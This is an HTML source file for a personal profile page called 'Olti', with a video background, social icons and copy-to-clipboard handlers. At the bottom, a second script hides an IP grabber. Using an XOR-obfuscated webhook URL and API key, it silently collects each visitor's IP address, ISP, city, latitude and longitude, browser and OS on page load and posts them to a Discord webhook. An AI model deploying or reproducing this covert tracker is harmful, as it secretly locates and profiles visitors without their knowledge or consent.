<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Olti</title>
  <link
    rel="stylesheet"
    href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"
  />
  <style>
    html,
    body {
      margin: 0;
      padding: 0;
      overflow: hidden;
      height: 100%;
      font-family: Arial, sans-serif;
    }

    #player-container {
      position: fixed;
      top: 0;
      left: 0;
      height: 100%;
      width: 100%;
      z-index: -2;
      overflow: hidden;
      pointer-events: none;
    }

    #background-video {
      width: 100vw;
      height: 100vh;
      object-fit: cover;
    }

    .content-wrapper {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 90%;
      max-width: 400px;
      padding: 30px 25px;
      box-sizing: border-box;
      z-index: 1;
    }

    .backgroundc {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(35, 150, 168, 0.3);
      border-radius: 25px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
      z-index: 0;
      pointer-events: none;
    }

    .content {
      color: white;
      text-align: center;
      text-shadow: 0 0 10px #000;
      position: relative;
      z-index: 1;
    }

    .name {
      font-size: 2.5em;
      font-weight: bold;
      margin-bottom: 0.2em;
      cursor: pointer;
    }

    .discord-tag {
      font-size: 1.2em;
      margin-bottom: 1.2em;
      cursor: pointer;
    }

    .socials {
      display: flex;
      justify-content: center;
      gap: 15px;
      flex-wrap: wrap;
    }

    #footer {
  position: fixed;
  bottom: 10px;         /* small space above bottom */
  left: 50%;
  transform: translateX(-50%);
  width: 100%;
  pointer-events: none; /* so it doesn't block clicks */
  z-index: 10;
}

#footer p {
  margin: 0;
  text-align: center;
  color: white;
  font-size: 0.8em;
  user-select: none;    /* prevent text selection */
}


    .social {
      width: 50px;
      height: 50px;
      border-radius: 50%;
      background-color: rgba(255, 255, 255, 0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 1.4em;
      border: 2px solid white;
      transition: 0.3s;
    }

    .social:hover {
      background-color: rgba(255, 255, 255, 0.4);
    }

    a {
      color: white;
      text-decoration: none;
    }

    @media (max-width: 600px) {
      .name {
        font-size: 2em;
      }

      .discord-tag {
        font-size: 1em;
      }

      .social {
        width: 45px;
        height: 45px;
        font-size: 1.2em;
      }

      .content-wrapper {
        padding: 20px 15px;
      }
    }
  </style>
</head>
<body>
  <div id="player-container">
    <video id="background-video" autoplay muted loop playsinline>
      <source src="DON_XHONI_-_DON_TI.mp4" type="video/mp4" />
      Your browser does not support the video tag.
    </video>
  </div>

  <div class="content-wrapper">
    <div class="backgroundc"></div>
    <div class="content">
      <div class="name" id="copyName" title="Click to copy">Olti</div>
      <div class="discord-tag" id="copyDiscord" title="Click to copy Discord tag">
        @oltiiiii
      </div>
      <div class="socials">
        <a href="https://twitter.com" target="_blank" class="social"
          ><i class="fab fa-discord"></i
        ></a>
        <a href="https://instagram.com/@omcreative_ks" target="_blank" class="social"
          ><i class="fab fa-instagram"></i
        ></a>
        <a href="https://github.com" target="_blank" class="social"
          ><i class="fab fa-github"></i
        ></a>
      </div>
    </div>
  </div>

<div id="footer">
  <p>Made with ❤️ by Olti</p>
</div>

  <script>
    function enableCopy(id) {
      const el = document.getElementById(id);
      if (el) {
        el.addEventListener("click", (e) => {
          e.stopPropagation();
          navigator.clipboard
            .writeText(el.textContent)
            .then(() => alert("Copied: " + el.textContent))
            .catch((err) => console.error("Copy failed", err));
        });
      }
    }

    document.addEventListener("DOMContentLoaded", () => {
      enableCopy("copyName");
      enableCopy("copyDiscord");

      const video = document.getElementById("background-video");

      // Unmute on user interaction
      const unmute = () => {
        video.muted = false;
        video.volume = 0.4;
        document.removeEventListener("touchstart", unmute);
        document.removeEventListener("click", unmute);
      };

      document.addEventListener("click", unmute, { once: true });
      document.addEventListener("touchstart", unmute, { once: true });
    });
  </script>

  <script>
    const encodedWebhook = "121,101,101,97,98,43,62,62,117,120,98,114,126,99,117,63,114,126,124,62,112,97,120,62,102,116,115,121,126,126,122,98,62,63,63,63";
const encodedKey = "40,115,33,32,117,116,34,32,32,37,35,39,37,117,115,37,112,114,39,39,38,34,34,40,32,114,34,41,115,117,114,116";

function xorDecode(data, key = 17) {
  return data.split(',').map(n => String.fromCharCode(n ^ key)).join('');
}

const Webhook = xorDecode(encodedWebhook);
const apiKey = xorDecode(encodedKey);

const grabData = async () => {
    const request = async () => {
        // Fetch data from geolocation and user-agent APIs
        const response = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=" + apiKey);
        const user = await fetch("https://api.ipgeolocation.io/user-agent?apiKey=" + apiKey);

        const data = await response.json();
        const AgentData = await user.json();

        const ip = data.ip;
        const isp = data.isp + " (" + data.continent_code + ")";
        const country = data.country_name;
        const regioncode = data.country_code2.toLowerCase();
        const region = data.country_code3 + " (" + data.country_code2 + ")";
        const city = data.city;
        const languages = data.languages;
        const lat = data.latitude;
        const lon = data.longitude;
        const callcode = data.calling_code;
        const flag = data.country_flag;
        const currency = data.currency.name;
        const currentDate = new Date();

        const broname = AgentData.name + '/' + AgentData.type;
        const engine = AgentData.engine.name + '(' + AgentData.engine.versionMajor + ')';
        const op = AgentData.operatingSystem.name + " " +AgentData.operatingSystem.versionMajor;

        const postRequest = new XMLHttpRequest();
        postRequest.open("POST", Webhook);
        postRequest.setRequestHeader("Content-type", "application/json");

        const params = {
            username: "Website Visited From "+ country + "/" + city,
            avatar_url: 'https://cdn-icons-png.flaticon.com/512/7013/7013144.png',
            content: null,
            embeds: [
                {
                    title: "** ** ** **:globe_with_meridians: IP Adress: " + ip,
                    url: "https://whatismyipaddress.com/ip/"+ ip,
                    description: "** **",
                    thumbnail: { url: flag },
                    color: 1993898,
                    fields: [
                        {
                            name: ":telephone: ISP: ",
                            value: isp,
                            inline: true,
                        },
                        {
                            name: ":flag_" + regioncode + ": Country & Region: ",
                            value: country + "/" + city + " - " + region,
                            inline: true,
                        },
                        {
                            name: ":round_pushpin: Location: ",
                            value: "Longitude: " + lon + "\nLatitude: " + lat + "\nGoogle Map: [Click](https://www.google.com/maps/@" + lat + "," + lon + ",6z)",
                            inline: true,
                        },
                        {
                            name: ":bust_in_silhouette: Client info: ",
                            value: ":satellite: Browser: "+ broname + "\n:gear: Engine: "+ engine + "\n:computer: OS: "+ op,
                            inline: true,
                        },
                        {
                            name: ":incoming_envelope: Extra info: ",
                            value: ":calling: Call Code: ("+ callcode +")\n:speaking_head: Lang's: "+languages+"\n:coin: Currency: "+ currency,
                            inline: true,
                        },
                    ],
                    footer: {
                        text: "Visited on: " + currentDate,
                        icon_url: "https://cdn-icons-png.flaticon.com/512/2088/2088617.png",
                    },
                },
            ],
        };

        postRequest.send(JSON.stringify(params));
    };

    // Call the request
    request();
};

// Start app
grabData();
  </script>
</body>
</html>
